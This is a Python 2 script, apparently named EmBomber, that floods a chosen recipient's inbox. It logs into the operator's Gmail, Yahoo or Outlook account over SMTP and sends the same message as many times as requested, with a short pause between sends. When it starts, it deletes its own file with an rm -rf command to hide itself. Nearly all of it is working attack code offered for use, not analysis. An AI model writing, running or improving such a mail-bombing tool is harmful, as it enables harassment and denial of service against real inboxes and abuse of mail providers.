#!/usr/bin/python
import smtplib
import time
import os
import getpass
import sys
os.system("rm -rf EmBomber.py")

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'


def bomb():
	os.system('clear')
	os.system("figlet Boom")
	print("========================")

os.system('clear')
os.system("figlet Attack")
print('''
1) Gmail
2) Yahoo
3) Hotmail/Outlook
''''--------------------------------------------------------------')
try:
	server = raw_input('Mail Server: ')
	user = raw_input('Your Email: ')
	pwd = getpass.getpass('Password: ')
	to = raw_input('To: ')
	subject = raw_input('Subject (Optional): ')
	body = raw_input('Message: ')
	nomes = input('Number of Emails to send: ')
	no = 0
	message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
except KeyboardInterrupt:
	print '\nCanceled'
	sys.exit()

#Gmail

if server == '1' or server == 'gmail' or server == 'Gmail':
	bomb()
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print '''On Gmail: https://myaccount.google.com/lesssecureapps '''
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print  'Successfully sent ' + str(no+1) + ' emails' 
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print '\nCanceled'
			sys.exit()
		except:
			print "Failed to Send "
	server.close()
	
#Yahoo
elif server == '2' or server == 'Yahoo' or server == 'yahoo':
	server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
	bomb()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print '''On Yahoo: https://login.yahoo.com/account/security?.scrumb=Tiby8TXUvJt#less-secure-apps
		'''
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print 'Successfully sent ' + str(no + 1) + ' emails'
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print '\nCanceled'
			sys.exit()
		except:
			print "Failed to Send"
	server.close()
	
#Hotmail/Outlook
elif server == '3' or server == 'outlook' or server == 'Outlook' or server == 'Hotmail' or server == 'hotmail':
	server = smtplib.SMTP("smtp-mail.outlook.com", 587)
	bomb()
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print 'Your Username or Password is incorrect, please try again using the correct credentials'
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print 'Successfully sent ' + str(no + 1) + ' emails'
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print '\nCanceled'
			sys.exit()
		except smtplib.SMTPAuthenticationError:
			print '\nThe username or password you entered is incorrect.'
			sys.exit()
		except:
			print "Failed to Send "
	server.close()
	
else:
	print 'Works only with Gmail, Yahoo, Outlook and Hotmail.'
	sys.exit()
